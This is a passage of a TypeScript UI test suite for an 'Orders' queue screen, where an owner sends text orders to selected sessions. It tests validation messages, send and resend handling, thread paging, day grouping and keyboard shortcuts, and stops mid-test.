  // spec §9.2 → Foot: a press with something missing says what, and focus goes to the control that fixes it
  const invalids = [
    { name: "no session ticked", targets: targetsOf(0), text: "rebase on main", invalid: { message: "Tick at least one session in the rail.", focus: "rail" } },
    { name: "blank text", targets: targetsOf(1), text: " \n\t ", invalid: { message: "Write the order, then send.", focus: "box" } },
    { name: "more targets than one send takes", targets: targetsOf(MAX_TARGETS + 3), text: "rebase on main", invalid: { message: `Up to ${MAX_TARGETS} sessions per order: untick 3.`, focus: "rail" } },
    { name: "the cap itself", targets: targetsOf(MAX_TARGETS), text: "rebase on main", invalid: null },
  ];
  for (const row of invalids) test(`a send press: ${row.name}`, () => assert.deepEqual(call("getOrderInvalidQ", row.targets, row.text), row.invalid));

  // spec §4.5 → the Orders composer sends a new order to the ticked sessions; it never answers or closes a report
  test("the Orders composer sends the typed order to the ticked sessions and no item action", () => {
    const { queue, calls } = buildQueue({ orders: buildOrders({ composer: { text: "typed order", isBusy: false, error: null }, send: (...args: unknown[]) => calls.push(["orderSend", ...args]) }) });
    const listed = withList(queue, []);
    const box = call("getOrderBoxQ", listed);
    const targets = { ids: [SESSION_ID], names: ["atrium"], endedCount: 0 };
    const tree = render("OrderComposerQ", { queue: listed, targets, box, tray: call("getTrayQ", { fieldId: "queue-order-text", box }) });
    assert.equal(collectText(tree).includes("Re:"), false);
    const [send] = findNodes(tree, (node) => node.type === "button" && String(node.props.className).includes("primary"));
    (send?.props.onClick as () => void)();
    assert.deepEqual(getPlain(calls.filter((one) => ["settle", "orderSend"].includes(String(one[0])))).map((one) => (one as unknown[]).slice(0, 2)), [["orderSend", { sessionIds: [SESSION_ID], text: "typed order" }]]);
  });

  // spec §10 → Rail "no session takes a message": the note says so, not "tick one"; before the rail loads nothing is known
  const notes = [
    { name: "none ticked", count: 0, rows: [buildSessionRow()], note: "Tick a session in the rail to address this order." },
    { name: "none ticked before the rail loads", count: 0, rows: null, note: "Tick a session in the rail to address this order." },
    { name: "no session takes a message", count: 0, rows: [buildSessionRow({ isSelectable: false }), buildSessionRow({ id: REPLACED_ID, state: "exited", exitReason: "replaced", isSelectable: false })], note: "No session can take an order right now." },
    { name: "one ticked", count: 1, rows: [buildSessionRow()], note: "Goes to s0." },
    { name: "several ticked", count: 2, rows: [buildSessionRow()], note: "Each ticked session gets its own copy." },
  ];
  for (const row of notes) test(`the note at rest: ${row.name}`, () => assert.equal(call("getOrderNoteQ", targetsOf(row.count), row.rows), row.note));

  test("the page's per-send target cap is the send route's: the cap passes and one more is refused", () => {
    const text = "rebase on main";
    const ids = (count: number) => Array.from({ length: count }, () => randomUUID());
    assert.equal(messageBodySchema.safeParse({ sessionIds: ids(MAX_TARGETS), text }).success, true);
    assert.equal(messageBodySchema.safeParse({ sessionIds: ids(MAX_TARGETS + 1), text }).success, false);
  });
});

// spec §4.5 → two composers on one screen: the sheet's label names the item, the Orders label the people
describe("the two composers told apart", () => {
  const labels = [
    { name: "a decision's box is about the decision", item: buildItem({ id: 3, isFreeTextAllowed: true }), label: "Your own answer or a note on this decision (optional)" },
    { name: "a report's box is an order on the report, to its session", item: buildItem({ id: 5, kind: "report", options: [], isFreeTextAllowed: true, session: buildSession({ name: "yoaida" }) }), label: "Order to yoaida on this report (optional)" },
  ];
  for (const row of labels) {
    test(`the sheet's label: ${row.name}`, () => {
      const [label] = findNodes(renderSheet({ item: row.item, queue: buildQueue().queue }), (node) => node.type === "label" && String(node.props.className).includes("field-label"));
      assert.equal(collectText(label as RenderedNode), row.label);
    });
  }
});

describe("an order send's answer", () => {
  const run = async (status: number, answer: unknown) => {
    const posts: Array<{ url: string; body: unknown }> = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (url: string, init: { body: string }) => {
        posts.push({ url, body: JSON.parse(init.body) });
        return { status, json: async () => answer };
      },
    })) as ScreenModule;
    let composer: Record<string, unknown> = { text: "rebase on main", isBusy: false, error: null };
    const statuses: unknown[] = [];
    const counts = { sent: 0, refused: 0 };
    const isDone = await (module.sendMessageQ as (deps: unknown) => Promise<boolean>)({
      body: { sessionIds: [SESSION_ID, ENDED_ID], text: "rebase on main" },
      names: ["gersona", "yoaida"],
      setComposer: (next: (prev: Record<string, unknown>) => Record<string, unknown>) => { composer = next(composer); },
      setStatus: (next: unknown) => statuses.push(next),
      onSent: () => { counts.sent += 1; },
      onRefused: () => { counts.refused += 1; },
    });
    return { isDone, posts: getPlain(posts), composer: getPlain(composer), statuses: getPlain(statuses), sent: counts.sent, refused: counts.refused };
  };

  // spec §9.3 → After sending: the ticks stay, so the next line goes to the same sessions; the list's status line names them
  test("a taken send posts every ticked id with the text, empties the box, says who it went to and re-reads", async () => {
    const result = await run(201, { items: [{ id: 81, sessionId: SESSION_ID }, { id: 82, sessionId: ENDED_ID }] });
    assert.deepEqual(result.posts, [{ url: "/api/queue/owner/messages/send", body: { sessionIds: [SESSION_ID, ENDED_ID], text: "rebase on main" } }]);
    assert.equal(result.isDone, true);
    assert.deepEqual(result.composer, { text: "", isBusy: false, error: null });
    assert.deepEqual(result.statuses, [{ text: "✓ Order sent to gersona and yoaida", orderId: 81 }]);
    assert.deepEqual([result.sent, result.refused], [1, 0]);
  });

  const refusals = [
    { name: "a replaced target names the server's reason", status: 409, answer: { error: "session_replaced", reason: "a replaced session takes no message" }, error: "Refused: a replaced session takes no message." },
    { name: "an unknown target names the server's reason", status: 404, answer: { error: "unknown_session", reason: "every target must be a registered session" }, error: "Refused: every target must be a registered session." },
    { name: "a refusal with no reason shows fixed copy", status: 403, answer: { error: "forbidden" }, error: "The monitor refused this order. Try again." },
  ];
  // spec §4.4: a refused send is followed by a read at once
  for (const row of refusals) {
    test(`a refused send keeps the text and re-reads the page: ${row.name}`, async () => {
      const result = await run(row.status, row.answer);
      assert.equal(result.isDone, false);
      assert.deepEqual(result.composer, { text: "rebase on main", isBusy: false, error: row.error });
      assert.deepEqual([result.statuses, result.sent, result.refused], [[], 0, 1]);
    });
  }

  test("a send during an outage gives the page's outage step", async () => {
    const result = await run(503, { error: "database_unavailable" });
    assert.equal(result.composer.error, call("getActionErrorQ", { status: 503, data: { error: "database_unavailable" } }));
  });

  const sentLines = [
    { name: "one session", names: ["gersona"], line: "✓ Order sent to gersona" },
    { name: "three sessions", names: ["gersona", "yoaida", "atrium"], line: "✓ Order sent to gersona, yoaida and atrium" },
  ];
  for (const row of sentLines) test(`the sent line names every recipient: ${row.name}`, () => assert.equal(call("getOrderSentStatusQ", row.names), row.line));
});

describe("Orders", () => {
  const OTHER_ID = "3d8a51c2-7e04-4b19-a6c3-5f2e9d0b8a17";
  const named = (name: string, id = SESSION_ID) => buildSession({ id, name });
  const copy = (overrides: Record<string, unknown>) => buildItem({ kind: "message", status: "answered", options: [], answeredAt: "2026-11-12T12:26:04.118Z", ...overrides });

  // spec §3.1 → three panes always: nothing is put away for Orders, and nothing opens or closes it
  test("the desk holds Orders beside the middle pane at rest, with nothing put away and no mode", () => {
    const tree = render("QueueDeskQ", { queue: withList(buildQueue().queue, [buildItem({ id: 1 })]) });
    const [desk] = findNodes(tree, (node) => typeof node.props?.className === "string" && node.props.className.startsWith("queue-desk"));
    assert.equal(desk?.props.className, "queue-desk");
    assert.equal(findNodes(tree, (node) => node.props?.hidden === true && node.type === "div" && node.props.className !== "queue-list-slot").length, 0);
    assert.equal(findNodes(tree, (node) => node.type === "OrdersViewQ").length, 1);
  });

  const heads = [
    { name: "nothing ticked → to every session", ids: [], sub: "to every session" },
    { name: "the ticked sessions by name", ids: [SESSION_ID, ENDED_ID], sub: "to nightly-docs-sweep, atrium-hooks" },
  ];
  for (const row of heads) {
    test(`the Orders head names whose orders the thread holds, with no Close and no Clear: ${row.name}`, () => {
      const tree = renderOrders({}, { selectedIds: row.ids, isEndedShown: true });
      const [card] = findNodes(tree, (node) => node.props?.atom === "Card");
      assert.equal(collectText(renderScreen(card?.props.sub) as RenderedNode), row.sub);
      assert.deepEqual(["Close", "Clear", "New order"].map((label) => buttonLabelled(tree, label).length), [0, 0, 0]);
    });
  }

  test("the history read asks for the ticked sessions' orders a page at a time, and Show earlier continues from the cursor", async () => {
    const urls: string[] = [];
    const pages = [
      { items: [copy({ id: 90, sendId: "s2" }), copy({ id: 70, sendId: "s1" })], nextCursor: "1762950364118000:70" },
      { items: [copy({ id: 70, sendId: "s1" }), copy({ id: 40, sendId: "s0" })], nextCursor: null },
    ];
    const module = (await loadScreenModule(QUEUE_SRC, {
      URLSearchParams,
      window: { UI: uiStub() },
      fetch: async (url: string) => {
        urls.push(url);
        return { status: 200, json: async () => pages[urls.length - 1] };
      },
    })) as ScreenModule;
    let thread: { items: Array<{ id: number }>; nextCursor: string | null } = { items: [], nextCursor: null };
    const setThread = (next: (prev: unknown) => typeof thread) => { thread = next(thread); };
    await (module.getThreadQ as (deps: unknown) => Promise<void>)({ ids: [SESSION_ID, OTHER_ID], before: null, setThread });
    await (module.getThreadQ as (deps: unknown) => Promise<void>)({ ids: [SESSION_ID, OTHER_ID], before: thread.nextCursor, setThread });
    const queries = urls.map((url) => Object.fromEntries(new URL(url, "http://monitor").searchParams));
    assert.deepEqual(urls.map((url) => url.split("?")[0]), ["/api/queue/owner/orders", "/api/queue/owner/orders"]);
    assert.deepEqual(queries, [{ limit: "30", sessionIds: `${SESSION_ID},${OTHER_ID}` }, { limit: "30", sessionIds: `${SESSION_ID},${OTHER_ID}`, before: "1762950364118000:70" }]);
    assert.deepEqual(getPlain(thread.items).map((item) => item.id), [90, 70, 40], "a copy on both pages is kept once");
  });

  // spec §4.4: an arrival never moves the thread → the page's own re-read keeps every loaded order, the oldest one at the top included
  test("an arrival keeps every loaded order: the re-read updates the orders it covers and keeps the ones it pushed past its end", async () => {
    const answer = { items: [copy({ id: 95, sendId: "s3" }), copy({ id: 90, sendId: "s2" }), copy({ id: 70, sendId: "s1", status: "delivered" })], nextCursor: "1762950364118000:70" };
    const module = (await loadScreenModule(QUEUE_SRC, { URLSearchParams, window: { UI: uiStub() }, fetch: async () => ({ status: 200, json: async () => answer }) })) as ScreenModule;
    let thread = { status: "ready", items: [copy({ id: 90, sendId: "s2" }), copy({ id: 70, sendId: "s1" }), copy({ id: 40, sendId: "s0" })], nextCursor: "1762950364118000:40", error: null };
    const setThread = (next: (prev: typeof thread) => typeof thread) => { thread = next(thread); };
    await (module.getThreadQ as (deps: unknown) => Promise<void>)({ ids: [SESSION_ID], before: null, setThread, isQuiet: true });
    const items = getPlain(thread.items) as Array<{ id: number; status: string }>;
    assert.deepEqual([items.map((item) => [item.id, item.status]), thread.nextCursor], [[[95, "answered"], [90, "answered"], [70, "delivered"], [40, "answered"]], "1762950364118000:40"]);
  });

  // a page cap past the server's → every re-read of a long thread is refused and the thread stops updating
  test("the page's history sizes are the server's: its page is the default, and its cap passes where one more does not", () => {
    const ORDERS = vm.runInContext("ORDERS_Q", screen) as { PAGE: number; MAX: number };
    const limit = (value: number) => ownerOrdersQuerySchema.safeParse({ limit: String(value) }).success;
    assert.deepEqual([ownerOrdersQuerySchema.parse({}).limit, limit(ORDERS.MAX), limit(ORDERS.MAX + 1)], [ORDERS.PAGE, true, false]);
  });

  test("no tick reads the orders to every session", async () => {
    const urls: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, { URLSearchParams, window: { UI: uiStub() }, fetch: async (url: string) => { urls.push(url); return { status: 200, json: async () => ({ items: [], nextCursor: null }) }; } })) as ScreenModule;
    await (module.getThreadQ as (deps: unknown) => Promise<void>)({ ids: [], before: null, setThread: () => undefined });
    assert.deepEqual(Object.fromEntries(new URL(urls[0] as string, "http://monitor").searchParams), { limit: "30" });
  });

  test("the thread folds the copies of one send into one entry, the oldest order first", () => {
    const items = [
      copy({ id: 91, sendId: "s2", session: named("yoaida", OTHER_ID) }), copy({ id: 90, sendId: "s2" }),
      buildItem({ id: 50, kind: "report", status: "delivered", options: [], answeredAt: "2026-11-11T09:00:00.000Z", answer: { code: null, text: "ship it" } }),
      copy({ id: 31, sendId: null, answeredAt: "2026-11-10T01:00:00.000Z", body: "old", session: named("yoaida", OTHER_ID) }), copy({ id: 30, sendId: null, answeredAt: "2026-11-10T01:00:00.000Z", body: "old" }),
    ];
    const entries = call<Array<{ id: number; copies: Array<{ id: number }> }>>("getThreadEntriesQ", items);
    assert.deepEqual(entries.map((entry) => [entry.id, entry.copies.map((one) => one.id)]), [[30, [30, 31]], [50, [50]], [90, [90, 91]]]);
  });

  test("an order shows its text, a reply to a report leads its time line with Re: and the report's title", () => {
    // the bubble's text rides ProseText's prop → read beside the rendered text
    const text = (item: unknown) => {
      const tree = render("OrderEntryQ", { entry: call<unknown[]>("getThreadEntriesQ", [item])[0], onResend: () => undefined });
      return [collectText(tree), ...findNodes(tree, (node) => node.props?.atom === "ProseText").map((node) => String(node.props.text))].join(" ");
    };
    const message = text(copy({ id: 90, sendId: "s2", body: "rebase on main" }));
    const reply = text(buildItem({ id: 50, kind: "report", title: "Nightly sweep done", status: "delivered", options: [], answeredAt: "2026-11-11T09:00:00.000Z", answer: { code: null, text: "ship it" } }));
    assert.ok(message.includes("rebase on main") && !message.includes("Re:"), message);
    assert.ok(reply.includes("ship it") && reply.includes("Re: Nightly sweep done"), reply);
  });

  test("each recipient shows its one receipt word, and only a recipient that did not receive it can be resent", () => {
    const resent: unknown[] = [];
    const entry = call<unknown[]>("getThreadEntriesQ", [
      copy({ id: 90, sendId: "s2", status: "delivered", deliveredAt: "2026-11-12T12:28:00.000Z", session: named("gersona") }),
      copy({ id: 91, sendId: "s2", session: named("yoaida", OTHER_ID) }),
      copy({ id: 92, sendId: "s2", status: "unacked", canResend: true, session: named("atrium", ENDED_ID) }),
    ])[0];
    const tree = render("OrderEntryQ", { entry, onResend: (id: number) => resent.push(id) });
    const rows = findNodes(tree, (node) => node.props?.className === "queue-recipient").map((node) => collectText(node));
    assert.deepEqual(rows.map((row) => [["gersona", "yoaida", "atrium"].find((name) => row.startsWith(name)), ["Received", "Not yet", "Not received"].find((word) => row.includes(word))]), [["gersona", "Received"], ["yoaida", "Not yet"], ["atrium", "Not received"]]);
    const resends = buttonLabelled(tree, "Resend");
    assert.equal(resends.length, 1);
    (resends[0]?.props.onClick as () => void)();
    assert.deepEqual(getPlain(resent), [[92]]);
  });

  // the page's one action state (queue.busy) names the copy a resend is for → only that recipient's row shows it
  const resendStates = [
    {
      name: "in flight → the pressed recipient's Resend and Resend to 2 read Resending… and take no press; the other row's stays",
      busy: { id: 92, error: null },
      rows: [["queue-recipient", [["Resend", false, true]], ""], ["queue-recipient", [["Resending…", true, false]], ""]],
      all: [["Resending…", true, false]],
    },
    {
      name: "refused → the reason under that recipient only, every Resend back at rest",
      busy: { id: null, error: { id: 92, message: "Refused: atrium ended." } },
      rows: [["queue-recipient", [["Resend", false, true]], ""], ["queue-recipient", [["Resend", false, true]], ""], ["queue-recipient-refusal", [], "✕ Refused: atrium ended."]],
      all: [["Resend to 2", false, true]],
    },
  ];
  for (const row of resendStates) {
    test(`a recipient's resend: ${row.name}`, () => {
      const thread = { status: "ready", nextCursor: null, error: null, items: [
        copy({ id: 91, sendId: "s3", status: "unacked", canResend: true, session: named("yoaida", OTHER_ID) }),
        copy({ id: 92, sendId: "s3", status: "unacked", canResend: true, session: named("atrium", ENDED_ID) }),
      ] };
      const { queue } = buildQueue({ busy: row.busy, orders: buildOrders({ thread }) });
      const tree = renderCard("OrdersViewQ", { queue: withList(queue, []) });
      const looks = (node: RenderedNode) => findNodes(node, (inner) => inner.type === "button").map((button) => [collectText(button).trim(), button.props["aria-busy"] === true, typeof button.props.onClick === "function"]);
      const [list] = findNodes(tree, (node) => node.props?.className === "queue-recipients");
      const items = findNodes(list as RenderedNode, (node) => node.type === "li").map((item) => [item.props.className, looks(item), findNodes(item, (inner) => inner.type === "p" && inner.props.role === "alert").map((line) => collectText(line).replace(/\s+/g, " ").trim()).join("")]);
      assert.deepEqual(items, row.rows);
      const inList = new Set(findNodes(list as RenderedNode, (node) => node.type === "button"));
      const all = findNodes(tree, (node) => node.type === "button" && !inList.has(node) && /^Resend/.test(collectText(node).trim()));
      assert.deepEqual(all.flatMap(looks), row.all);
    });
  }

  const lines = (count: number) => Array.from({ length: count }, (_, index) => `step ${index + 1}`).join("\n");
  const clamps = [
    { name: "12 lines show in full with no disclosure", body: lines(12), isClamped: false, more: [] },
    { name: "31 lines clamp at 12 under Show all 31 lines", body: lines(31), isClamped: true, more: ["Show all 31 lines"] },
  ];
  for (const row of clamps) {
    test(`an order's bubble: ${row.name}`, () => {
      const tree = render("OrderEntryQ", { entry: call<unknown[]>("getThreadEntriesQ", [copy({ id: 90, sendId: "s2", body: row.body })])[0], onResend: () => undefined });
      const [bubble] = findNodes(tree, (node) => String(node.props?.className ?? "").split(" ").includes("queue-bubble"));
      assert.equal(String(bubble?.props.className).split(" ").includes("is-clamped"), row.isClamped);
      assert.deepEqual(findNodes(tree, (node) => node.type === "summary").map((node) => collectText(node).trim()), row.more);
    });
  }

  const fan = (receipts: string[]) => receipts.map((receipt, index) => copy({
    id: 90 + index, sendId: "s7", session: named(`session-${index}`, randomUUID()),
    ...({ received: { status: "delivered", deliveredAt: "2026-11-12T12:28:00.000Z" }, notYet: {}, notReceived: { status: "unacked", canResend: true } } as Record<string, object>)[receipt],
  }));
  test("five recipients or more fold into one roll-up line; a recipient that did not receive it stays listed under it", () => {
    const entry = call<unknown[]>("getThreadEntriesQ", fan(["received", "received", "received", "received", "received", "notYet", "notReceived"]))[0];
    const tree = render("OrderEntryQ", { entry, onResend: () => undefined });
    const [rollUp] = findNodes(tree, (node) => node.type === "summary");
    assert.ok(collectText(rollUp as RenderedNode).includes("7 sessions · 5 received · 1 not yet"), collectText(rollUp as RenderedNode));
    assert.ok(collectText(rollUp as RenderedNode).includes("1 not received"), collectText(rollUp as RenderedNode));
    const [details] = findNodes(tree, (node) => node.type === "details");
    const outside = findNodes(tree, (node) => node.props?.className === "queue-recipient").filter((node) => !findNodes(details as RenderedNode, (inner) => inner === node).length);
    assert.deepEqual(outside.map((node) => collectText(node).split("Not")[0]?.trim()), ["session-6"]);
    assert.equal(findNodes(details as RenderedNode, (node) => node.props?.className === "queue-recipient").length, 6, "the not received one is listed once, outside");
  });

  test("four recipients keep a row each and no roll-up line", () => {
    const tree = render("OrderEntryQ", { entry: call<unknown[]>("getThreadEntriesQ", fan(["received", "notYet", "notYet", "notReceived"]))[0], onResend: () => undefined });
    assert.equal(findNodes(tree, (node) => node.type === "details").length, 0);
    assert.equal(findNodes(tree, (node) => node.props?.className === "queue-recipient").length, 4);
  });

  const resendAlls = [
    { name: "two that can be resent → Resend to 2, sent to those two only", receipts: ["received", "notReceived", "notYet", "notReceived"], label: ["Resend to 2"], ids: [91, 93] },
    { name: "one that can be resent → its own Resend only", receipts: ["received", "notReceived"], label: [], ids: [] },
  ];
  for (const row of resendAlls) {
    test(`resending several recipients: ${row.name}`, () => {
      const resent: unknown[] = [];
      const tree = render("OrderEntryQ", { entry: call<unknown[]>("getThreadEntriesQ", fan(row.receipts))[0], onResend: (ids: unknown) => resent.push(getPlain(ids)) });
      const all = findNodes(tree, (node) => node.type === "button" && /^Resend to /.test(collectText(node).trim()));
      assert.deepEqual(all.map((node) => collectText(node).trim()), row.label);
      if (all[0]) (all[0].props.onClick as () => void)();
      assert.deepEqual(resent, all[0] ? [row.ids] : []);
    });
  }

  // days are KST days: 15:30Z is already the next day in Seoul
  test("the thread's day labels group orders by KST day: Today, Yesterday, else the date", () => {
    const at = (answeredAt: string, id: number) => ({ id, item: { answeredAt }, copies: [] });
    const entries = [at("2026-11-10T03:00:00.000Z", 1), at("2026-11-11T14:59:00.000Z", 2), at("2026-11-11T15:01:00.000Z", 3), at("2026-11-12T15:30:00.000Z", 4)];
    const groups = call<Array<{ label: string; entries: Array<{ id: number }> }>>("getDayGroupsQ", entries, new Date("2026-11-12T16:00:00.000Z"));
    assert.deepEqual(groups.map((group) => [group.label, group.entries.map((entry) => entry.id)]), [["2026-11-10", [1]], ["2026-11-11", [2]], ["Yesterday", [3]], ["Today", [4]]]);
  });

  // spec §9.2 → Label line: every receiving session by name, an ended one tagged; none → said, all of it dim
  const labelLines = [
    { name: "the ticked names, an ended one tagged", ids: [SESSION_ID, ENDED_ID], text: "New order to nightly-docs-sweep, atrium-hooks Ended" },
    { name: "no tick says so", ids: [], text: "New order · no session ticked" },
  ];
  for (const row of labelLines) {
    test(`the Orders composer's label line: ${row.name}`, () => {
      const tree = renderOrders({}, { selectedIds: row.ids, isEndedShown: true });
      const [label] = findNodes(tree, (node) => node.type === "label" && String(node.props.className).includes("field-label"));
      assert.equal(collectText(label as RenderedNode).replace(/\s+/g, " ").trim(), row.text);
    });
  }
});

// a focused element on the desk: `inside` = the selectors it sits within, `session` = the rail row it sits in
function buildKeyTarget({ tag = "DIV", type = "", inside = [] as string[], session = "" } = {}) {
  return {
    tagName: tag,
    type,
    isContentEditable: false,
    closest: (selector: string) => {
      if (selector === "[data-session]") return session ? { getAttribute: () => session } : null;
      return selector.split(",").some((part) => inside.includes(part.trim())) ? { querySelector: (inner: string) => keyRoot.querySelector(inner) } : null;
    },
  };
}

// document stand-in: each element the handlers reach records what was done to it
const keyActs: string[] = [];
const keyElement = (name: string) => ({ focus: () => keyActs.push(`focus ${name}`), click: () => keyActs.push(`click ${name}`) });
const keyRoot = {
  elements: {} as Record<string, unknown>,
  querySelector(selector: string) { return this.elements[selector] ?? null; },
  getElementById(id: string) { return this.elements[`#${id}`] ?? null; },
};

describe("desk keys", () => {
  const OTHER_TICK_ID = "8c41e7d2-5b9a-4f06-b3e1-7d2a6c9f0e58";
  const desk = buildKeyTarget();
  const sheet = buildKeyTarget({ inside: [".queue-sheet"] });
  const rows = [
    { name: "J selects the next row", key: "j", expected: { name: "next" } },
    { name: "K selects the previous row", key: "k", expected: { name: "prev" } },
    { name: "a capital letter is its key", key: "J", expected: { name: "next" } },
    { name: "a digit picks the option at its position", key: "3", expected: { name: "pick", index: 2 } },
    { name: "zero picks nothing", key: "0", expected: null },
    { name: "R goes to the sheet's field", key: "r", expected: { name: "field" } },
    { name: "E marks as read", key: "e", expected: { name: "read" } },
    { name: "L puts it later", key: "l", expected: { name: "later" } },
    { name: "N starts a new order", key: "n", expected: { name: "new" } },
    { name: "O orders the selected item's session", key: "o", expected: { name: "order" } },
    { name: "a letter with Cmd is the browser's", key: "j", metaKey: true, expected: null },
    { name: "a letter with Alt is the browser's", key: "n", altKey: true, expected: null },
    { name: "a letter typed in a text field is text", key: "j", target: buildKeyTarget({ tag: "TEXTAREA", inside: [".queue-sheet"] }), expected: null },
    { name: "a letter typed in a text input is text", key: "e", target: buildKeyTarget({ tag: "INPUT", type: "text" }), expected: null },
    { name: "a letter on a radio is a key", key: "2", target: buildKeyTarget({ tag: "INPUT", type: "radio", inside: [".queue-sheet"] }), expected: { name: "pick", index: 1 } },
    { name: "the switch off leaves letters alone", key: "j", isKeysOn: false, expected: null },
    { name: "the switch off leaves digits alone", key: "1", isKeysOn: false, expected: null },
    { name: "the switch off keeps Esc", key: "Escape", target: sheet, isKeysOn: false, expected: { name: "back" } },
    { name: "Esc in the sheet goes back to the selected row", key: "Escape", target: sheet, expected: { name: "back" } },
    { name: "Esc in the sheet's field goes back too", key: "Escape", target: buildKeyTarget({ tag: "TEXTAREA", inside: [".queue-sheet"] }), expected: { name: "back" } },
    { name: "Esc on the list does nothing", key: "Escape", expected: null },
    { name: "Esc in Orders gives the focus back to the middle pane", key: "Escape", target: buildKeyTarget({ inside: [".queue-orders"] }), expected: { name: "leave" } },
    { name: "Esc in the Orders box gives it back too", key: "Escape", target: buildKeyTarget({ tag: "TEXTAREA", inside: [".queue-orders"] }), expected: { name: "leave" } },
    { name: "an open dialog takes the Esc first", key: "Escape", target: buildKeyTarget({ inside: ['[role="dialog"]', ".queue-orders"] }), expected: null },
    { name: "an open dialog takes the letters too", key: "j", target: buildKeyTarget({ inside: ['[role="dialog"]'] }), expected: null },
    { name: "a key another handler took is left alone", key: "Escape", target: sheet, defaultPrevented: true, expected: null },
    { name: "Enter on a row goes into the sheet", key: "Enter", target: buildKeyTarget({ inside: ['[role="option"]'] }), expected: { name: "enter" } },
    { name: "Enter elsewhere is the control's own", key: "Enter", target: sheet, expected: null },
    { name: "Cmd+Enter in the sheet presses its send", key: "Enter", metaKey: true, target: sheet, expected: { name: "send" } },
    { name: "Ctrl+Enter in Orders presses its send", key: "Enter", ctrlKey: true, target: buildKeyTarget({ inside: [".queue-orders"] }), expected: { name: "send" } },
    { name: "Cmd+Enter on the list does nothing", key: "Enter", metaKey: true, target: buildKeyTarget({ inside: ['[role="option"]'] }), expected: null },
    { name: "Orders keeps N", key: "n", target: buildKeyTarget({ inside: [".queue-orders"] }), expected: { name: "new" } },
    { name: "Orders leaves the list's letters", key: "j", target: buildKeyTarget({ inside: [".queue-orders"] }), expected: null },
    { name: "Orders leaves the option digits", key: "1", target: buildKeyTarget({ inside: [".queue-orders"] }), expected: null },
  ];
  for (const row of rows) {
    test(`a desk key: ${row.name}`, () => {
      const event = { key: row.key, metaKey: row.metaKey ?? false, ctrlKey: row.ctrlKey ?? false, altKey: row.altKey ?? false, defaultPrevented: row.defaultPrevented ?? false, target: row.target ?? desk };
      assert.deepEqual(call("getDeskKeyQ", event, { isKeysOn: row.isKeysOn ?? true }), row.expected);
    });
  }

  const decision = buildItem({ id: 3 });
  const report = buildItem({ id: 5, kind: "report", options: [] });
  const order = buildItem({ id: 9, kind: "message", status: "answered", sendId: "s", options: [], session: buildSession({ id: ENDED_ID }) });
  // the desk with `selected` on the sheet (0 → the list, nothing open); `calls` records every queue act a key makes
  const deskWith = (selected: number, sessions: Record<string, unknown> = {}) => {
    const built = buildQueue({ sessions: buildSessions(sessions), openOrderRow: (row: { id: number }) => built.calls.push(["openOrderRow", row.id]) });
    const listed = withList(built.queue, [decision, report, order]);
    const groups = listed.groups as Array<{ rows: Array<{ id: number }> }>;
    const sheet = getSheet(groups, selected ? String(selected) : "");
    return { calls: built.calls, queue: { ...listed, sheet, selectedId: selected || null, steps: call("getStepsQ", groups, sheet.id, -1) } };
  };
  const press = (name: string, selected: number, extra: Record<string, unknown> = {}) => {
    keyActs.length = 0;
    const { calls, queue } = deskWith(selected, extra.sessions as Record<string, unknown>);
    (screen.putDeskKeyQ as (a: unknown, c: unknown) => void)({ name, index: extra.index }, { queue, target: extra.target ?? desk, root: keyRoot });
    return { calls: getPlain(calls), acts: [...keyActs] };
  };

  const sheetSteps = [
    { name: "J on a decision's sheet opens the report after it", action: "next", selected: 3, expected: [["selectRow", 5]] },
    { name: "K on the report's sheet opens the decision before it", action: "prev", selected: 5, expected: [["selectRow", 3]] },
    { name: "J on the last sheet passes over the order's row and opens nothing", action: "next", selected: 5, expected: [] },
  ];
  for (const row of sheetSteps) test(`a key's act: ${row.name}`, () => assert.deepEqual(press(row.action, row.selected).calls, row.expected));

  const rowTarget = (id: number) => ({ ...buildKeyTarget({ inside: ['[role="option"]'] }), closest: (selector: string) => (selector === '[role="option"]' ? { id: `queue-row-${id}` } : null) });
  const listSteps = [
    { name: "J on the list focuses the row after the focused one and opens nothing", action: "next", target: rowTarget(3), expected: "focus row 5" },
    { name: "K on the list focuses the row before the focused one", action: "prev", target: rowTarget(9), expected: "focus row 5" },
    { name: "J with no row focused focuses the first row", action: "next", target: undefined, expected: "focus row 3" },
  ];
  for (const row of listSteps) {
    test(`a key's act: ${row.name}`, () => {
      keyRoot.elements = { "#queue-row-3": keyElement("row 3"), "#queue-row-5": keyElement("row 5"), "#queue-row-9": keyElement("row 9") };
      const pressed = press(row.action, 0, { target: row.target });
      assert.deepEqual([pressed.acts, pressed.calls], [[row.expected], []]);
    });
  }

  test("Enter on a row opens its sheet", () => assert.deepEqual(press("enter", 0, { target: rowTarget(5) }).calls, [["selectRow", 5]]));

  test("Enter on an order's row shows its entry in Orders and opens no sheet", () => assert.deepEqual(press("enter", 0, { target: rowTarget(9) }).calls, [["openOrderRow", 9]]));

  const picks = [
    { name: "a digit on an open decision picks that option", selected: 3, index: 1, expected: [["setDraft", 3, { code: "R2", error: null }]] },
    { name: "a digit past the last option picks nothing", selected: 3, index: 4, expected: [] },
    { name: "a digit on a report picks nothing", selected: 5, index: 0, expected: [] },
  ];
  for (const row of picks) test(`a key's act: ${row.name}`, () => assert.deepEqual(press("pick", row.selected, { index: row.index }).calls, row.expected));

  const presses = [
    { name: "E presses the sheet's Mark as read", action: "read", selector: '.queue-sheet [data-key="e"]' },
    { name: "L presses the sheet's later button", action: "later", selector: '.queue-sheet [data-key="l"]' },
  ];
  for (const row of presses) {
    test(`a key's act: ${row.name}`, () => {
      keyRoot.elements = { [row.selector]: keyElement(row.action) };
      assert.deepEqual(press(row.action, 5).acts, [`click ${row.action}`]);
    });
  }

  test("R puts the caret in the sheet's field", () => {
    keyRoot.elements = { ".queue-sheet .queue-compose-text": keyElement("field") };
    assert.deepEqual(press("field", 5).acts, ["focus field"]);
  });

  test("Esc from the sheet goes back to the list", () => assert.deepEqual(press("back", 5).calls, [["back"]]));

  test("Cmd+Enter presses the primary button of the pane holding the focus", () => {
    keyRoot.elements = { ".queue-composer .btn.primary": keyElement("Send answer") };
    assert.deepEqual(press("send", 3, { target: sheet }).acts, ["click Send answer"]);
  });

  // spec §9.2 → Foot, §11: in Orders the send key answers as a press of the send button does, inked or not
  // → the rendered order composer, a key on its box bubbling to the desk as the page wires it
  const ordersKeyDesk = async (targets: { ids: string[]; names: string[]; endedCount: number }) => {
    const focused: string[] = [];
    const sent: unknown[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
